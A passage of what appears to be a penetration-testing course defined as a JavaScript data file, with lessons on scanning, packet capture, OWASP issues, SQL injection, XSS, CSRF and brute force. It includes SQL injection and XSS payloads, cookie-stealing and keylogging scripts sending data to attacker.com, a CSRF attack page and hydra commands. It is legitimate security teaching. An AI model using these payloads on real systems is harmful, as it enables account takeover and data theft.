Key UDP ports: 53 (DNS), 67 (DHCP), 69 (TFTP — often unauthenticated), 161 (SNMP — often uses default community strings), 123 (NTP).

In your notes, list five UDP services and explain what information or access each one could provide to an attacker.`,
              image: null,
            },
            {
              title: 'Packet Capture with tcpdump',
              instruction:
                `tcpdump captures network traffic from the command line. It is available on almost every Linux system and is essential for quick captures during an engagement.

\`\`\`bash
# Capture all traffic on the default interface
sudo tcpdump

# Capture on a specific interface and save to file
sudo tcpdump -i eth0 -w capture.pcap

# Capture only HTTP traffic
sudo tcpdump -i eth0 port 80

# Show packet contents in ASCII (useful for unencrypted protocols)
sudo tcpdump -i eth0 -A port 80

# Capture DNS traffic
sudo tcpdump -i eth0 port 53
\`\`\`

Practical exercise: run \`sudo tcpdump -i eth0 -w http_capture.pcap port 80\`, then in another terminal run \`curl http://example.com\`, stop the capture, and open it in Wireshark. Find the HTTP GET request and the server response. What does the Server header reveal?`,
              image: null,
            },
          ],
        },
        {
          id: 'room2',
          title: 'DNS, HTTP & Common Protocols',
          overview:
            'DNS and HTTP are the protocols attackers abuse most. Understanding them at the packet level is essential for web attacks, phishing, and network reconnaissance.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'DNS Deep Dive',
              instruction:
                `DNS translates domain names to IP addresses. It is also a rich source of reconnaissance information.

DNS record types: A (IPv4), AAAA (IPv6), MX (mail), NS (name servers), TXT (SPF/DKIM), CNAME (alias), PTR (reverse), SOA (zone info).

\`\`\`bash
# Query all record types
dig google.com ANY

# Query specific record types
dig google.com MX
dig google.com NS
dig google.com TXT

# Reverse DNS lookup
dig -x 8.8.8.8

# Attempt a DNS zone transfer (reveals all subdomains if misconfigured)
dig axfr @nsztm1.digi.ninja zonetransfer.me

# Enumerate subdomains manually
for SUB in www mail ftp admin vpn dev staging api; do
    dig +short "$SUB.target.com"
done
\`\`\`

A DNS zone transfer reveals every subdomain and IP in the zone — a complete map of the target's infrastructure. Try the zone transfer against zonetransfer.me (a deliberately vulnerable public example) and document every record returned.`,
              image: '01-cat.png',
            },
            {
              title: 'HTTP in Depth',
              instruction:
                `HTTP is the foundation of the web. Every web attack operates over HTTP. You need to understand it at the packet level.

\`\`\`bash
# Make a GET request and show all headers
curl -v http://example.com

# Make a POST request with form data
curl -X POST -d "username=admin&password=test" http://example.com/login

# Make a POST request with JSON
curl -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"test"}' \
     http://example.com/api/login

# Show only response headers (useful for fingerprinting)
curl -I http://example.com

# Send a cookie
curl -b "session=abc123" http://example.com/dashboard
\`\`\`

Security-relevant headers to look for:
\`\`\`bash
# Run this and read every header
curl -I https://target.com
\`\`\`

- \`Server: Apache/2.4.41\` — reveals server software and version
- \`X-Powered-By: PHP/7.4.3\` — reveals backend technology
- \`Set-Cookie: session=abc123\` — is HttpOnly set? Is Secure set?
- Missing \`X-Frame-Options\` — clickjacking vulnerability
- Missing \`Content-Security-Policy\` — XSS mitigation absent

Run \`curl -I\` against a target and document every security-relevant header (or missing header).`,
              image: null,
            },
            {
              title: 'HTTP Methods and Their Abuse',
              instruction:
                `HTTP methods define the intended action. Understanding each one — and how they can be abused — is essential for web application testing.

\`\`\`bash
# Discover what methods the server accepts
curl -X OPTIONS http://example.com -v

# Test if PUT is enabled (could allow file upload)
curl -X PUT -d "test content" http://example.com/test.txt

# Test if DELETE is enabled
curl -X DELETE http://example.com/resource/1

# Check the Allow header in the OPTIONS response
curl -X OPTIONS http://target.com -v 2>&1 | grep -i allow
\`\`\`

Security implications: PUT/DELETE without authentication allows resource modification or deletion. TRACE enabled can be used in cross-site tracing (XST) attacks.

Test a target with OPTIONS. Document every method it accepts. For any method beyond GET and POST, investigate whether it requires authentication.`,
              image: null,
            },
            {
              title: 'Other Protocols: SMTP, FTP, SSH',
              instruction:
                `These protocols are commonly found on targets and are frequently misconfigured.

SSH (port 22):
\`\`\`bash
# Connect to a remote host
ssh user@192.168.1.1

# Banner grab (identify SSH version)
nc 192.168.1.1 22

# Brute force SSH (with permission only)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
\`\`\`

FTP (port 21):
\`\`\`bash
# Check for anonymous login (common misconfiguration)
ftp 192.168.1.1
# Username: anonymous  Password: (press Enter)

# Banner grab
nc 192.168.1.1 21
\`\`\`

SMTP (port 25):
\`\`\`bash
# Banner grab and user enumeration
nc 192.168.1.1 25
EHLO attacker.com
VRFY admin
VRFY root
QUIT
\`\`\`

For each protocol, note: the port, what it exposes when misconfigured, and what tool you would use to test it.`,
              image: null,
            },
          ],
        },
        {
          id: 'room3',
          title: 'Network Scanning & Enumeration',
          overview:
            'Enumeration is the foundation of every successful engagement. This room teaches nmap from first principles — not just the commands, but what each scan type does and why.',
          estimatedMinutes: 30,
          steps: [
            {
              title: 'nmap Fundamentals',
              instruction:
                `nmap is the industry-standard tool for network discovery. Understanding what each scan type does at the packet level makes you a better operator.

Port states: Open (SYN-ACK received), Closed (RST received), Filtered (no response — firewall dropping).

\`\`\`bash
# Basic scan — top 1000 TCP ports
nmap 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# Scan specific ports
nmap -p 22,80,443,3306 192.168.1.1

# Discover live hosts without port scanning
nmap -sn 192.168.1.0/24

# Skip host discovery (treat all hosts as online)
nmap -Pn 192.168.1.1

# SYN scan (stealthy, requires root)
sudo nmap -sS 192.168.1.1

# Fast scan — top 100 ports
nmap -F 192.168.1.1
\`\`\`

Run a basic scan against your target. Document every open port. Before moving on, write down what service you expect on each port based on the port number alone.`,
              image: null,
            },
            {
              title: 'Service and Version Detection',
              instruction:
                `Version detection tells you exactly what software is running — and what vulnerabilities it might have.

\`\`\`bash
# Service version detection
nmap -sV 192.168.1.1

# OS detection (requires root)
sudo nmap -O 192.168.1.1

# Aggressive scan — OS, version, scripts, traceroute
sudo nmap -A 192.168.1.1

# Save output in all formats
nmap -sV -oA scan_results 192.168.1.1
\`\`\`

Once you have version numbers, search for known vulnerabilities:
\`\`\`bash
# Search the local exploit database
searchsploit apache 2.4.41
searchsploit openssh 7.4

# Search online: nvd.nist.gov, exploit-db.com, cve.mitre.org
\`\`\`

Run a version scan against your target. For every service detected, search for known CVEs affecting that version. Document your findings.`,
              image: null,
            },
            {
              title: 'nmap Scripting Engine (NSE)',
              instruction:
                `The NSE extends nmap with hundreds of scripts for enumeration, vulnerability detection, and more.

\`\`\`bash
# Run default scripts
nmap --script=default 192.168.1.1

# Run vulnerability scripts
nmap --script=vuln 192.168.1.1

# HTTP enumeration
nmap --script=http-enum,http-title,http-methods,http-headers -p 80,443 192.168.1.1

# SMB enumeration (Windows targets)
nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.1.1

# Check for EternalBlue (MS17-010)
nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.1

# MySQL enumeration
nmap --script=mysql-info,mysql-databases -p 3306 192.168.1.1

# FTP anonymous login check
nmap --script=ftp-anon -p 21 192.168.1.1

# List all available scripts
ls /usr/share/nmap/scripts/
\`\`\`

Run the default scripts against your target. Document every piece of additional information gathered. Pay particular attention to any scripts that flag potential vulnerabilities.`,
              image: null,
            },
            {
              title: 'Building a Recon Workflow',
              instruction:
                `Professional penetration testers follow a systematic enumeration workflow. This ensures nothing is missed and findings are reproducible.

\`\`\`bash
# Phase 1: Host discovery
sudo nmap -sn 192.168.1.0/24 -oG hosts.txt
grep "Up" hosts.txt | awk '{print $2}' > live_hosts.txt

# Phase 2: Fast port scan of all ports
sudo nmap -p- --min-rate 5000 -iL live_hosts.txt -oA all_ports

# Phase 3: Detailed scan of open ports
sudo nmap -sV -sC -p 22,80,443,3306 192.168.1.1 -oA detailed_scan

# Phase 4: Vulnerability scanning
sudo nmap --script=vuln -p 22,80,443 192.168.1.1 -oA vuln_scan
\`\`\`

Phase 5 is always manual verification. Tools produce false positives. A finding you cannot reproduce manually is not a finding.

Build this workflow into a script. Run it against your target and produce a structured report: host, port, service, version, and any vulnerabilities identified.`,
              image: null,
            },
          ],
        },
        {
          id: 'room4',
          title: 'Packet Analysis',
          overview:
            'Wireshark is the industry-standard tool for packet analysis. Reading traffic at the packet level is a core skill for credential harvesting, protocol analysis, and incident response.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'Wireshark Fundamentals',
              instruction:
                `Wireshark captures and displays network packets in real time, decoding protocols automatically.

The interface has three panes: packet list (top), packet details (middle — decoded structure layer by layer), and packet bytes (bottom — raw hex and ASCII).

\`\`\`bash
# Capture from the command line with tshark
sudo tshark -i eth0

# Capture and save to file
sudo tshark -i eth0 -w capture.pcap

# Read a saved capture
tshark -r capture.pcap

# Apply a display filter
tshark -r capture.pcap -Y "http"
\`\`\`

Start a capture, browse to \`http://example.com\` (HTTP, not HTTPS — you need unencrypted traffic), and stop. In the packet list, find the HTTP GET request. Click it and expand each layer in the packet details pane. Write down what each layer contains.`,
              image: null,
            },
            {
              title: 'Display Filters',
              instruction:
                `Display filters let you focus on specific traffic. They are one of Wireshark's most powerful features.

\`\`\`bash
# Protocol filters
http
dns
tcp
udp
icmp

# IP address filters
ip.addr == 192.168.1.1
ip.src == 192.168.1.1

# Port filters
tcp.port == 80
udp.port == 53

# HTTP method filters
http.request.method == "POST"
http.response.code == 401

# Content filters
http contains "password"

# Combine filters
http and ip.src == 192.168.1.100
\`\`\`

Practical exercise: capture traffic while logging in to an HTTP application. Apply \`http.request.method == "POST"\`. Find the login request. In the packet details, expand "HTML Form URL Encoded". Read the credentials sent in plaintext. This is why HTTPS is mandatory.`,
              image: null,
            },
            {
              title: 'Following Streams',
              instruction:
                `"Follow Stream" reconstructs a complete conversation between two hosts as readable text.

How to follow a stream: right-click any packet → Follow → TCP Stream. Red text = client sent, blue text = server sent.

\`\`\`bash
# Extract HTTP POST data from a pcap
tshark -r capture.pcap -Y "http.request.method == POST" \
       -T fields -e http.file_data

# Extract FTP credentials
tshark -r capture.pcap -Y "ftp" \
       -T fields -e ftp.request.command -e ftp.request.arg

# Extract Telnet data (everything is plaintext)
tshark -r capture.pcap -Y "telnet" -T fields -e data.text
\`\`\`

Capture traffic while logging in to an HTTP application. Follow the TCP stream of the login request. Document exactly what was transmitted, including all headers and the request body.`,
              image: null,
            },
            {
              title: 'DNS Analysis',
              instruction:
                `DNS traffic reveals what domains a host is communicating with — even when connections are encrypted. This is valuable for both reconnaissance and incident response.

\`\`\`bash
# Filter for DNS queries in Wireshark
dns.flags.response == 0

# Filter for NXDOMAIN (domain not found — useful for detecting DGA malware)
dns.flags.rcode == 3

# Detect potential DNS tunnelling (unusually long queries)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
    awk 'length > 50' | sort | uniq -c | sort -rn
\`\`\`

DNS tunnelling encodes data in DNS queries to bypass firewalls. Tools like \`iodine\` and \`dnscat2\` implement this technique.

Start a capture, browse several websites, and stop. Apply the DNS filter. For every domain resolved, note the IP address returned. Are there any domains you do not recognise? Research them.`,
              image: null,
            },
          ],
        },
      ],
    },

    // ── PHASE 4: WEB & BACKEND SYSTEMS (moduleId: 4, 5 rooms) ───────────────
    {
      id: 'phase4',
      title: 'Web & Backend Systems',
      codename: 'PHASE 4',
      rooms: [
        {
          id: 'room1',
          title: 'How the Web Works',
          overview:
            'Before you can attack a web application, you need to understand exactly how it communicates. This room covers HTTP at the packet level — requests, responses, headers, cookies, and sessions.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'Browser DevTools and the Network Tab',
              instruction:
                `Every web attack starts with understanding what the browser is sending and receiving. Browser DevTools gives you a real-time view of every HTTP request.

Open the target web application. Press F12 (or Ctrl+Shift+I) to open DevTools. Navigate to the Network tab. Reload the page with Ctrl+R.

You will see a list of every request the browser made. Each row shows:
- **Method** — GET, POST, etc.
- **Status** — 200 (OK), 301 (redirect), 404 (not found), 500 (server error)
- **Type** — document, script, stylesheet, XHR (API call), fetch
- **Size** — response size
- **Time** — how long the request took

Click on the main HTML document (usually the first request). You will see two tabs: Headers and Response.

In the Headers tab, look at the Response Headers. Write down every header and what it reveals about the server. Pay particular attention to:
- \`Server:\` — web server software and version
- \`X-Powered-By:\` — backend technology
- \`Set-Cookie:\` — session management
- \`Content-Security-Policy:\` — XSS protections (or lack thereof)`,
              image: '01-site.png',
            },
            {
              title: 'Reading HTTP Headers',
              instruction:
                `HTTP headers carry metadata about the request and response. Reading them carefully reveals information about the server, the application, and its security posture.

Use curl to inspect headers from the command line:
\`\`\`bash
# Show full request and response with headers
curl -v http://target.com

# Show only response headers
curl -I http://target.com

# Follow redirects and show headers at each step
curl -IL http://target.com
\`\`\`

**Request headers an attacker controls:**
- \`Host:\` — the domain being requested (used in virtual hosting attacks)
- \`User-Agent:\` — identifies the browser (can be spoofed)
- \`Cookie:\` — session tokens and other client-side data
- \`Referer:\` — where the request came from (can be spoofed)
- \`X-Forwarded-For:\` — original IP when behind a proxy (can be spoofed to bypass IP restrictions)

**Response headers that reveal information:**
- \`Server: Apache/2.4.41 (Ubuntu)\` — exact server version
- \`X-Powered-By: PHP/7.4.3\` — backend language and version
- \`X-AspNet-Version: 4.0.30319\` — .NET version

Run \`curl -I\` against your target. Document every header. For each one that reveals technology information, search for known vulnerabilities in that version.`,
              image: '02-inspect.png',
            },
            {
              title: 'Cookies and Sessions',
              instruction:
                `HTTP is stateless — each request is independent. Cookies are how web applications maintain state (keep you logged in). Understanding cookies is essential for session attacks.

**Inspecting cookies in DevTools:**
1. Open DevTools → Application tab → Cookies
2. You will see every cookie set by the application
3. For each cookie, note: Name, Value, Domain, Path, Expires, Size, HttpOnly, Secure, SameSite

**Critical cookie attributes:**
- \`HttpOnly\` — prevents JavaScript from reading the cookie (mitigates XSS-based session theft)
- \`Secure\` — cookie only sent over HTTPS (prevents interception on HTTP)
- \`SameSite=Strict\` — cookie not sent on cross-site requests (mitigates CSRF)

**Inspecting cookies with curl:**
\`\`\`bash
# Log in and capture the session cookie
curl -v -c cookies.txt -d "username=admin&password=test" http://target.com/login

# Use the captured cookie in subsequent requests
curl -v -b cookies.txt http://target.com/dashboard

# View the cookie file
cat cookies.txt
\`\`\`

Log in to the target application. Inspect the session cookie. Answer these questions: Is HttpOnly set? Is Secure set? What is the SameSite value? Is the cookie value predictable or random? Log out — is the cookie invalidated on the server?`,
              image: '03-elements.png',
            },
            {
              title: 'Intercepting Requests with Burp Suite',
              instruction:
                `Burp Suite is the industry-standard tool for web application testing. It acts as a proxy between your browser and the target, letting you intercept, modify, and replay every request.

**Setting up Burp Suite:**
\`\`\`bash
# Start Burp Suite
burpsuite &

# Configure your browser to use Burp as a proxy:
# Proxy: 127.0.0.1  Port: 8080

# Install the Burp CA certificate in your browser
# (Burp → Proxy → Options → Import/Export CA Certificate)
\`\`\`

**Key Burp Suite features:**
- **Proxy → Intercept** — pause requests before they are sent, modify them, then forward
- **Proxy → HTTP History** — view every request/response that has passed through
- **Repeater** — send a request repeatedly with modifications (right-click → Send to Repeater)
- **Intruder** — automated attack tool for brute force, fuzzing, and enumeration
- **Scanner** (Pro only) — automated vulnerability scanner

**Basic workflow:**
1. Enable intercept in Burp Proxy
2. Log in to the target application in your browser
3. Burp will pause the login request
4. Read the full request — note the parameters being sent
5. Forward the request
6. In HTTP History, find the login request and response
7. Right-click → Send to Repeater
8. In Repeater, modify the password and resend — observe the difference in response

        Log in to the target application through Burp. Capture the login request. Document every parameter sent and the full server response.`,
              image: null,
            },
          ],
        },
        {
          id: 'room2',
          title: 'OWASP Top 10 Overview',
          overview:
            'The OWASP Top 10 is the industry standard reference for web application security risks. This room explains each category in depth — not just what it is, but how it is exploited and how to find it.',
          estimatedMinutes: 20,
          steps: [
            {
              title: 'The OWASP Top 10 — Categories 1-5',
              instruction:
                `The OWASP (Open Web Application Security Project) Top 10 is updated every few years based on real-world vulnerability data. The 2021 edition:

**A01 — Broken Access Control** (most common): Users can access resources or perform actions they should not be permitted to. Examples: accessing another user's account by changing an ID in the URL, accessing admin pages without admin privileges, modifying other users' data.

**A02 — Cryptographic Failures**: Sensitive data exposed due to weak or missing encryption. Examples: passwords stored in plaintext or with weak hashing (MD5), sensitive data transmitted over HTTP, weak TLS configuration.

**A03 — Injection**: Untrusted data sent to an interpreter as part of a command or query. Examples: SQL injection, command injection, LDAP injection, XPath injection.

**A04 — Insecure Design**: Flaws in the design of the application, not just the implementation. Examples: no rate limiting on login, no account lockout, business logic flaws.

**A05 — Security Misconfiguration**: Insecure default configurations, unnecessary features enabled, verbose error messages. Examples: default credentials, directory listing enabled, detailed stack traces in error messages.

For each of these five categories, write: one sentence describing the vulnerability, one concrete example of how it is exploited, and one way to detect it during a penetration test.`,
              image: null,
            },
            {
              title: 'The OWASP Top 10 — Categories 6-10',
              instruction:
                `**A06 — Vulnerable and Outdated Components**: Using libraries, frameworks, or other software with known vulnerabilities. Examples: outdated jQuery with known XSS vulnerabilities, old Apache Struts (the Equifax breach vector).

**A07 — Identification and Authentication Failures**: Weaknesses in authentication and session management. Examples: weak passwords allowed, no multi-factor authentication, session tokens not invalidated on logout, predictable session IDs.

**A08 — Software and Data Integrity Failures**: Code and infrastructure that does not protect against integrity violations. Examples: insecure deserialization, CI/CD pipeline compromise, unsigned software updates.

**A09 — Security Logging and Monitoring Failures**: Insufficient logging means attacks go undetected. Examples: login failures not logged, no alerting on suspicious activity, logs not protected from tampering.

**A10 — Server-Side Request Forgery (SSRF)**: The server makes requests to an attacker-controlled URL. Examples: fetching a URL from user input that points to internal services (AWS metadata endpoint, internal databases).

For each category, write: the vulnerability description, an exploitation example, and a detection method. Then rank all 10 by which you think would be most impactful to find in a real engagement and explain your reasoning.`,
              image: null,
            },
            {
              title: 'Identifying OWASP Issues in a Real Application',
              instruction:
                `Theory is only useful when you can apply it. This step teaches you to systematically look for OWASP Top 10 issues in a real application.

**Checklist for a quick OWASP assessment:**

Broken Access Control:
\`\`\`bash
# Test IDOR (Insecure Direct Object Reference)
# Log in as user A, note your user ID in the URL
# Change the ID to another user's ID
curl -b "session=userA_token" http://target.com/api/users/2
curl -b "session=userA_token" http://target.com/api/users/1
\`\`\`

Security Misconfiguration:
\`\`\`bash
# Check for directory listing
curl http://target.com/uploads/
curl http://target.com/backup/

# Check for default credentials
curl -u admin:admin http://target.com/admin
curl -u admin:password http://target.com/admin

# Check for verbose error messages
curl http://target.com/nonexistent-page
\`\`\`

Outdated Components:
\`\`\`bash
# Check server headers for version information
curl -I http://target.com

# Check JavaScript libraries in the page source
curl http://target.com | grep -i "jquery|bootstrap|angular|react"
\`\`\`

Open the demo application and work through this checklist. Document every finding with: the vulnerability category, the evidence, and the potential impact.`,
              image: null,
            },
          ],
        },
        {
          id: 'room3',
          title: 'SQL Injection',
          overview:
            'SQL injection remains one of the most impactful vulnerabilities in web applications. This room teaches you how SQL injection works from first principles, how to find it manually, and how to exploit it — not just how to run sqlmap.',
          estimatedMinutes: 35,
          steps: [
            {
              title: 'How SQL Injection Works',
              instruction:
                `SQL injection occurs when user-supplied input is incorporated into a SQL query without proper sanitisation. The attacker can break out of the intended query and inject their own SQL.

**A vulnerable login query:**
\`\`\`bash
# What the developer wrote (pseudocode):
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"

# With normal input (username=alice, password=secret):
SELECT * FROM users WHERE username='alice' AND password='secret'

# With malicious input (username=admin'-- , password=anything):
SELECT * FROM users WHERE username='admin'--' AND password='anything'
# The -- comments out the rest of the query
# Result: logs in as admin without knowing the password
\`\`\`

**Why this works:** The single quote \`'\` closes the string literal in the SQL query. The \`--\` is a SQL comment — everything after it is ignored. The query now only checks the username, not the password.

**Testing for SQL injection:**
1. Enter a single quote \`'\` in any input field
2. If the application throws a database error, it is likely vulnerable
3. If the application behaves differently (blank page, different content), it may be vulnerable

Navigate to the login form on the demo application. Enter \`'\` in the username field. Document exactly what happens — the error message, the HTTP response code, and any database information revealed in the error.`,
              image: null,
            },
            {
              title: 'Authentication Bypass',
              instruction:
                `The simplest SQL injection attack is authentication bypass — logging in without valid credentials.

**Common authentication bypass payloads:**
\`\`\`bash
# Username field payloads (use any password):
admin'--
admin'#
admin'/*
' OR '1'='1
' OR 1=1--
' OR 'x'='x
admin' OR '1'='1'--
\`\`\`

**How \`' OR '1'='1\` works:**
\`\`\`bash
# Original query:
SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'

# Since '1'='1' is always true, this returns all users
# The application logs you in as the first user (often admin)
\`\`\`

**Testing with curl:**
\`\`\`bash
# Test authentication bypass
curl -X POST -d "username=admin'--&password=anything" http://target.com/login -v

# Test with OR payload
curl -X POST -d "username=' OR '1'='1'--&password=x" http://target.com/login -v
\`\`\`

Try each payload in the username field of the demo application. Document which ones work and what the server returns for each. Note the difference in response between a failed login and a successful bypass.`,
              image: null,
            },
            {
              title: 'UNION-Based Data Extraction',
              instruction:
                `UNION-based injection allows you to extract data from other tables in the database by appending a UNION SELECT statement to the original query.

**How UNION injection works:**
\`\`\`bash
# Original query (e.g. product search):
SELECT name, description FROM products WHERE id=1

# UNION injection — append a second SELECT:
SELECT name, description FROM products WHERE id=1 UNION SELECT username, password FROM users--

# The result includes both the product data AND the user credentials
\`\`\`

**Steps to exploit UNION injection:**

Step 1 — Find the number of columns:
\`\`\`bash
# Try ORDER BY to find column count (increment until error)
http://target.com/product?id=1 ORDER BY 1--
http://target.com/product?id=1 ORDER BY 2--
http://target.com/product?id=1 ORDER BY 3--  # Error = 2 columns
\`\`\`

Step 2 — Find which columns are displayed:
\`\`\`bash
http://target.com/product?id=1 UNION SELECT NULL,NULL--
http://target.com/product?id=1 UNION SELECT 'test1','test2'--
\`\`\`

Step 3 — Extract data:
\`\`\`bash
# Get database version
http://target.com/product?id=1 UNION SELECT @@version,NULL--

# Get all tables
http://target.com/product?id=1 UNION SELECT table_name,NULL FROM information_schema.tables--

# Get usernames and passwords
http://target.com/product?id=1 UNION SELECT username,password FROM users--
\`\`\`

Work through these steps on the demo application. Document every piece of data you extract.`,
              image: null,
            },
            {
              title: 'sqlmap — Automated SQL Injection',
              instruction:
                `sqlmap automates the detection and exploitation of SQL injection vulnerabilities. Use it to confirm and expand on manual findings — not as a replacement for understanding the vulnerability.

\`\`\`bash
# Basic scan — detect SQL injection
sqlmap -u "http://target.com/product?id=1"

# Enumerate databases
sqlmap -u "http://target.com/product?id=1" --dbs

# Enumerate tables in a specific database
sqlmap -u "http://target.com/product?id=1" -D targetdb --tables

# Dump a specific table
sqlmap -u "http://target.com/product?id=1" -D targetdb -T users --dump

# Test a POST parameter
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username

# Use a Burp Suite request file
sqlmap -r burp_request.txt

# Increase verbosity to see what sqlmap is doing
sqlmap -u "http://target.com/product?id=1" -v 3

# Use a specific injection technique
sqlmap -u "http://target.com/product?id=1" --technique=U  # UNION only
\`\`\`

Run sqlmap against the demo application. Document: the injection point, the database type and version, every database found, every table in the target database, and the contents of the users table.

Then write the remediation: how would a developer fix this vulnerability? (Parameterised queries / prepared statements — write an example in any language.)`,
              image: null,
            },
            {
              title: 'Writing the SQL Injection Report',
              instruction:
                `A vulnerability finding is only valuable if it is communicated clearly. This step teaches you to write a professional SQL injection finding.

**A professional finding has five components:**

**1. Title:** SQL Injection in Product Search Parameter

**2. Severity:** Critical

**3. Description:** The \`id\` parameter in the product search endpoint is vulnerable to UNION-based SQL injection. An unauthenticated attacker can extract all data from the database, including user credentials.

**4. Proof of Concept:**
\`\`\`bash
# Request:
GET /product?id=1 UNION SELECT username,password FROM users-- HTTP/1.1
Host: target.com

# Response includes:
admin:5f4dcc3b5aa765d61d8327deb882cf99  (MD5 hash of "password")
\`\`\`

**5. Remediation:** Use parameterised queries (prepared statements) instead of string concatenation. Example in Python:
\`\`\`bash
# Vulnerable:
query = "SELECT * FROM products WHERE id=" + user_input

# Secure:
cursor.execute("SELECT * FROM products WHERE id = %s", (user_input,))
\`\`\`

Write a complete finding report for the SQL injection vulnerability you found in the demo application. Include all five components. Be specific — include the exact URL, parameter, payload, and extracted data.`,
              image: null,
            },
          ],
        },
        {
          id: 'room4',
          title: 'XSS & CSRF',
          overview:
            'XSS and CSRF are client-side attacks that target users of an application, not just the server. This room explains how each attack works mechanically, how to find them, and how to exploit them.',
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Cross-Site Scripting (XSS) — How It Works',
              instruction:
                `XSS occurs when an application includes untrusted data in a web page without proper escaping, allowing an attacker to execute JavaScript in another user's browser.

**Three types of XSS:**

**Reflected XSS** — the payload is in the URL and reflected immediately in the response:
\`\`\`bash
# Test for reflected XSS in a search parameter
http://target.com/search?q=<script>alert(1)</script>

# If the page renders the script tag without escaping, it executes
\`\`\`

**Stored XSS** — the payload is stored in the database and executed when any user views the page:
\`\`\`bash
# Submit a comment containing a script
POST /comments HTTP/1.1
body=<script>alert(document.cookie)</script>

# Every user who views the comments page executes the script
\`\`\`

**DOM-based XSS** — the payload is processed by client-side JavaScript without going to the server:
\`\`\`bash
# URL fragment processed by JavaScript
http://target.com/page#<img src=x onerror=alert(1)>
\`\`\`

**Testing for XSS:**
\`\`\`bash
# Basic test payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
\`\`\`

Find an input field on the demo application that reflects user input. Try each payload. Document which ones execute and which are blocked.`,
              image: null,
            },
            {
              title: 'XSS Impact and Cookie Theft',
              instruction:
                `An \`alert(1)\` proves XSS exists, but the real impact is much greater. XSS allows an attacker to execute arbitrary JavaScript in the victim's browser — including stealing session cookies.

**Cookie theft payload:**
\`\`\`bash
# Payload that sends the victim's cookies to the attacker's server
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

# Or using fetch (more modern, less detectable)
<script>
fetch('http://attacker.com/steal?c='+btoa(document.cookie))
</script>
\`\`\`

**Setting up a listener to receive stolen cookies:**
\`\`\`bash
# Simple Python HTTP server to receive stolen cookies
python3 -m http.server 8080

# Or use netcat
nc -lvnp 8080
\`\`\`

**Other XSS payloads:**
\`\`\`bash
# Keylogger — capture everything the user types
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keys?k=' + e.key)
}
</script>

# Redirect to a phishing page
<script>window.location='http://attacker.com/fake-login'</script>

# Deface the page
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
\`\`\`

**Why HttpOnly cookies matter:** If the session cookie has the HttpOnly flag, \`document.cookie\` will not include it — the cookie cannot be stolen via XSS. This is why HttpOnly is a critical security control.

Test the XSS payload on the demo application. Document whether the session cookie is accessible via JavaScript. What does this tell you about the application's security posture?`,
              image: null,
            },
            {
              title: 'Cross-Site Request Forgery (CSRF)',
              instruction:
                `CSRF tricks a logged-in user into performing an unintended action on a web application. The attack works because browsers automatically include cookies with every request to a domain.

**How CSRF works:**

1. The victim is logged in to bank.com (their session cookie is stored in the browser)
2. The victim visits attacker.com (a malicious page)
3. attacker.com contains a hidden form that submits to bank.com
4. The browser automatically includes the victim's bank.com session cookie
5. bank.com processes the request as if the victim submitted it intentionally

**A CSRF attack page:**
\`\`\`bash
<!-- Hosted on attacker.com -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
\`\`\`

**Testing for CSRF:**
\`\`\`bash
# 1. Find a state-changing action (transfer money, change email, change password)
# 2. Capture the request in Burp Suite
# 3. Check if there is a CSRF token in the request
# 4. If no token: the action is likely vulnerable to CSRF
# 5. If there is a token: check if it is validated server-side
#    (try removing it or using a token from a different session)
\`\`\`

**CSRF tokens** are random values included in forms that the server validates. They prevent CSRF because the attacker cannot know the victim's token.

Find a state-changing action in the demo application. Capture the request in Burp. Is there a CSRF token? If yes, try removing it and resubmitting — does the server reject it?`,
              image: null,
            },
            {
              title: 'Writing XSS and CSRF Findings',
              instruction:
                `Write professional findings for both vulnerabilities you found.

**XSS Finding Template:**
\`\`\`bash
Title: Stored Cross-Site Scripting in Comment Field
Severity: High
Location: POST /comments, body parameter
Payload: <script>document.location='http://attacker.com/?c='+document.cookie</script>
Impact: An attacker can steal session cookies of any user who views the comments
       page, leading to account takeover.
Remediation: HTML-encode all user-supplied output. Implement Content-Security-Policy
             header. Set HttpOnly flag on session cookies.
\`\`\`

**CSRF Finding Template:**
\`\`\`bash
Title: Cross-Site Request Forgery on Password Change Endpoint
Severity: High
Location: POST /account/change-password
Evidence: No CSRF token present in the request. The following PoC page
          changes the victim's password when visited while logged in:

<form action="http://target.com/account/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit()</script>

Impact: An attacker can change any logged-in user's password by tricking
        them into visiting a malicious page.
Remediation: Implement CSRF tokens on all state-changing requests.
             Validate the token server-side on every submission.
\`\`\`

Write complete findings for both vulnerabilities you found in the demo application. Include the exact payload, the evidence, the impact, and the remediation.`,
              image: null,
            },
          ],
        },
        {
          id: 'room5',
          title: 'Authentication Attacks',
          overview:
            'Authentication is the front door of every application — and it is often left unlocked. This room covers brute force, session attacks, and the full range of authentication weaknesses you will encounter in real engagements.',
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Brute Force and Password Spraying',
              instruction:
                `Brute force attacks try every possible password. Password spraying tries one common password against many accounts. Both are used to gain initial access.

**Brute force with Hydra:**
\`\`\`bash
# Brute force HTTP POST login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-post-form "target.com/login:username=^USER^&password=^PASS^:Invalid credentials"

# Brute force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Brute force with a username list
hydra -L users.txt -P passwords.txt http-post-form \
      "target.com/login:username=^USER^&password=^PASS^:Invalid"

